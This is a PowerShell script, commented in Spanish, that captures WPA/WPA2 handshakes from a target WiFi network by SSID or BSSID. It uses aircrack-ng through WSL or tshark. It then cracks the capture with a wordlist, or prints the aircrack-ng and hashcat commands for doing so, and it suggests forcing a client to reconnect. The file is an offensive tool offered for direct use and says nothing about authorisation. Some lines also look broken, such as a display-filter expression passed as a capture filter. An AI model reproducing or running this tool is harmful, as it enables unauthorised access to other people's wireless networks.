# =============================================================================
# capturar_handshake.ps1  --  Windows
# -----------------------------------------------------------------------------
# Captura handshake WPA/WPA2 de una red WiFi.
#
# Estrategia (en orden de preferencia):
#   1) Si tenés aircrack dentro de WSL (recomendado) --> llamo al .sh
#   2) Si no, uso tshark / Wireshark sobre una grabación Npcap
#
# Uso (PowerShell 5+):
#   PS> .\capturar_handshake.ps1 -Ssid "MiRed" -Timeout 600
#   PS> .\capturar_handshake.ps1 -Bssid "AA:BB:CC:DD:EE:FF" -Canal 6
#   PS> .\capturar_handshake.ps1 -Wsl               # fuerza por WSL
#   PS> .\capturar_handshake.ps1 -Pcap "C:\wifi\x.pcap"
#
# Requiere:
#   - WSL2 + aircrack-ng (para el backend WSL),  O
#   - Wireshark instalado (da 'tshark' en PATH).
#     Adapter WiFi que soporte modo monitor (p. ej. Alfa AWUS036NHA).
#
# La captura se guarda en .\captures\handshake_<fecha>.pcap
# =============================================================================

[CmdletBinding()]
param(
  [string]$Ssid,
  [string]$Bssid,
  [int]$Canal = 0,
  [int]$Timeout = 600,
  [string]$Pcap,
  [string]$OutDir = "captures",
  [switch]$Wsl,
  [switch]$Diccionario,
  [switch]$Listar
)

$ErrorActionPreference = "Stop"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

function Say($m) { Write-Host $m -ForegroundColor Cyan }
function Ok($m)  { Write-Host $m -ForegroundColor Green }
function Bad($m) { Write-Host $m -ForegroundColor Red }
function Warn($m){ Write-Host $m -ForegroundColor Yellow }
# ---------- Verificar dependencias -----------------------------------------
$hasTshark = $null -ne (Get-Command tshark -ErrorAction SilentlyContinue)
$hasWsl = $false
$hasAir = $false
try {
  $wslInfo = wsl -l -v 2>$null
  if ($LASTEXITCODE -eq 0 -and ($wslInfo | Out-String) -match "Running|RUNNING|Ejecutando") {
    $hasWsl = $true
    $airInWsl = (wsl -e bash -lc 'command -v airodump-ng >/dev/null 2>&1 && echo yes || echo no').Trim()
    $hasAir = ($airInWsl -eq "yes")
  }
} catch { }

# ---------- Si el usuario ya tiene un pcap -----------------------------------
if ($Pcap) {
  if (-not (Test-Path $Pcap)) { Bad "No existe $Pcap"; exit 1 }
  $capFile = $Pcap
  if ($hasTshark) {
    Say "Inspeccionando $capFile con tshark..."
    $eapol = & tshark -r $capFile -Y eapol -T fields -e frame.number 2>$null
    if ($eapol -and $eapol.Count -gt 0) {
      Ok "OK: el pcap contiene $($eapol.Count) frame(s) EAPOL (handshake presente)."
    } else {
      Bad "No hay frames EAPOL en este pcap: no tenés handshake."
    }
  }
  if ($Diccionario) {
    $wordlist = Read-Host "Ruta del diccionario"
    if ($hasWsl -and $hasAir) {
      Say "Corriendo aircrack-ng por WSL..."
      wsl -e bash -lc "aircrack-ng '$capFile' -w '$wordlist'"
    } else {
      Warn "Necesitás aircrack en WSL para crackear en línea: `n  `n  wsl -e bash -lc 'apt install aircrack-ng'`n`n  o copiá el pcap a Kali."
    }
  }
  exit 0
}

# ---------- Elegir backend --------------------------------------------------
$useWsl = $false
if ($Wsl) { $useWsl = $true }
elseif ($hasWsl -and $hasAir) { $useWsl = $true }
elseif ($hasTshark) { $useWsl = $false }
else {
  Bad "No hay backend disponible. Opciones:"
  Write-Host "  1) wsl --install -d Ubuntu  ->  wsl -e bash -lc 'apt install aircrack-ng'"
  Write-Host "  2) winget install Wireshark.Wireshark   (da tshark)"
  exit 1
}
Say "Backend: $(if ($useWsl) {'WSL + aircrack-ng'} else {'tshark (Windows)'})"

# ---------- Modo WSL: delegar al .sh ----------------------------
if ($useWsl) {
  if ($Listar) {
    Say "Listado de interfaces WiFi en WSL:"
    wsl -e bash -lc "ip -o link show type wifi 2>/dev/null || iw dev"
    Say "APs cercanos (6s):"
    wsl -e bash -lc "IF=\$(ip -o link show | awk -F: '/wlan/ {print \$2}' | head -1); airodump-ng \$IF -w /tmp/sc 2>&1 & P=\$!; sleep 6; kill \$P 2>/dev/null; cat /tmp/sc*out.txt 2>/dev/null || true"
    exit 0
  }
  $shPath = Join-Path $scriptDir "capturar_handshake.sh"
  if (-not (Test-Path $shPath)) { Bad "No encuentro $shPath"; exit 1 }

  $drive = $shPath.Substring(0, 1).ToLower()
  $rest  = $shPath.Substring(2).Replace("\", "/")
  $wslPath = "/mnt/$drive/$rest"

  $args2 = @()
  if ($Bssid -and -not $Ssid) { $args2 += "-t"; $args2 += $Bssid }
  elseif ($Ssid)              { $args2 += "-t"; $args2 += $Ssid }
  if ($Canal -gt 0)    { $args2 += "-c"; $args2 += [string]$Canal }
  if ($Timeout -gt 0)  { $args2 += "-T"; $args2 += [string]$Timeout }

  Say "Ejecutando en WSL: bash $wslPath" + (" " + ($args2 -join " "))
  wsl -e bash -lc "cd $(Split-Path $wslPath -Parent) && bash $(Split-Path $wslPath -Leaf) $($args2 -join ' ')"
  exit $LASTEXITCODE
}

# ---------- Modo tshark: grabar en Windows -----------------------------------
New-Item -ItemType Directory -Path (Join-Path $scriptDir $OutDir) -Force | Out-Null
$stamp   = (Get-Date).ToString("yyyyMMdd-HHmmss")
$capFile = Join-Path $scriptDir/$OutDir "handshake_${stamp}.pcap"

# adapters WiFi visibles
$adapters = Get-NetAdapter -ErrorAction SilentlyContinue |
  Where-Object { $_.InterfaceDescription -match "Wireless|Wi-?Fi|802\.11" }
if ($adapters -and $adapters.Count -gt 0) {
  Say "Adapters WiFi:"
  $adapters | Format-Table Name, InterfaceDescription, Status, LinkSpeed -Auto
}

$filter = "wlan"
if ($Bssid) { $filter = "wlan && (wlan.fixed.fcaddr1 == $Bssid || wlan.addr == $Bssid)" }

$tsharkArgs = @("-i", "0", "-w", $capFile, "-f", $filter, "-c", "50000")

Say "tshark $($tsharkArgs -join ' ')"
$proc = Start-Process -FilePath "tshark" -ArgumentList $tsharkArgs -PassThru -NoNewWindow

$found = $false
$lastPrintCount = -1
$deadline = (Get-Date).AddSeconds($Timeout)
while (-not $proc.HasExited -and (Get-Date) -lt $deadline) {
  Start-Sleep -Seconds 3
  try {
    $eapol = & tshark -r $capFile -Y eapol -T fields -e frame.number 2>$null
    if ($eapol -and $eapol.Count -gt 0) { $found = $true; break }
    if ($eapol -and $eapol.Count -ne $lastPrintCount) {
      Write-Host ("  ... {0} frame(s) EAPOL" -f $eapol.Count)
      $lastPrintCount = $eapol.Count
    }
  } catch { }
}
try { Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue } catch {}

if (-not $found) {
  Warn "Sin handshake en $($Timeout)s."
  Warn "Tips: reiniciá un cliente conectado a '$Ssid' para forzar reconexión."
  Warn "      O usá el modo WSL:  .\capturar_handshake.ps1 -Ssid '$Ssid' -Wsl"
  exit 2
}

# ---------- Verificar y ofrecer crack ------------------------------------------
$eapol = & tshark -r $capFile -Y eapol -T fields -e frame.number
Ok "Handshake presente: $($eapol.Count) frame(s) EAPOL."
Ok "Captura:  $capFile"

if ($Diccionario) {
  $wordlist = Read-Host "Ruta del diccionario (p. ej. C:\wordlists\rockyou.txt)"
  if ($hasWsl -and $hasAir) {
    Say "Corriendo aircrack vía WSL..."
    wsl -e bash -lc "aircrack-ng '$capFile' -w '$wordlist'"
  } else {
    Say "Copiá el .pcap a tu Kali y usá:  aircrack-ng <pcap> -w <dic>"
  }
}
else {
  Say "Para crackear la captura:"
  Say "  WSL:    wsl aircrack-ng '$capFile' -w /usr/share/wordlists/rockyou.txt"
  Say "  Kali:   aircrack-ng $capFile -w /usr/share/wordlists/rockyou.txt"
  Say "  Hashcat: hcxpcapngtool -o x.hc22000 $capFile && hashcat -m 22000 x.hc22000 -a 0 <dic>"
}
exit 0
